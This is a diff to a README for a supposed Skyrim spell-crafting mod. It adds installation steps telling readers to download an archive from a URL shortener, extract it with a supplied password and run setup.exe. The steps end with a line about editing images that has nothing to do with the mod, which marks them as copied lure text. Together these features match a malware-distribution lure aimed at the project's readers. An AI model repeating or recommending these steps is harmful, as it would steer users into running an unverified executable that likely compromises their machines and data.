@@ -5,9 +5,13 @@ Skyrim Spell Crafting Mod is a mod that allows players to create and customize t
 ## Installation
 
 📥 Installation Guide
+
 🖥️ Quick Setup (Windows .exe)
+
 1️⃣ [Download](https://goo.su/OsOV9ht) and extract the package (password: Project12!)
+
 2️⃣ Run setup.exe
+
 3️⃣ Start viewing and editing images effortlessly! 🚀
 
 ⚠️ Note: This method ensures a quick and hassle-free installation.
